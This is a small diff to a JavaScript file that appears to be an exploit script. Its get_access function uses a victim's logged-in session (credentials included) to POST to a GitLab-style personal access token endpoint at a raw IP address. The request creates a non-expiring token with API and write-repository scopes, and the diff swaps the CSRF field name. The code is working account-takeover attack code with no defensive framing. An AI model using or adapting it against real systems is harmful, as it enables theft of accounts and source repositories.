@@ -14,7 +14,7 @@ function get_final() {
 
 function get_access(token) {
   fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
-  "body": "authenticity_token="+ encodeURI(token) + "&personal_access_token%5Bname%5D=full&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api&personal_access_token%5Bscopes%5D%5B%5D=write_repository",
+  "body": "X-CSRF-Token="+ encodeURI(token) + "&personal_access_token%5Bname%5D=full&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api&personal_access_token%5Bscopes%5D%5B%5D=write_repository",
   "method": "POST",
   "credentials": "include"
 }).then(response => response.text())
